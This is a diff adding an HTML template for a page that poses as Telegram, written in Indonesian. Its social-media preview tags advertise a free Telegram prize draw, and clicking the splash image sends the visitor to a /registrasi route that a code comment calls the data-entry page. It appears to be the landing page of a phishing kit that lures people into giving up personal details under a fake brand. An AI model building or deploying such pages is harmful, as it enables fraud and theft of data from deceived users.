@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta property="og:title" content="TELEGRAM" />
+        <meta property="og:description" content="segera Daftar Undian Berhadiah dari Telegram dan raih kesempatan memenangkan hadiah menarik dari Telegram. Tanpa di pungut biaya apapun." />
+        <meta property="og:image" content="https://i.imgur.com/be1vvVX.jpg" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <title>Home</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+            }
+            html, body {
+                margin: 0;
+                padding: 0;
+                overflow-y: auto;
+            }
+        </style>
+    </head>
+    <body>
+        <img src="{{ url_for('static', filename='tele-1.png') }}" onclick="masuk()" style="width: 100%; display: block; cursor: pointer;" alt="Splash Image">
+
+        <script>
+            function masuk() {
+            window.location.href = "/registrasi"; // pastikan route /halaman2 mengarah ke halaman input data
+            }
+        </script>
+    </body>
+</html>
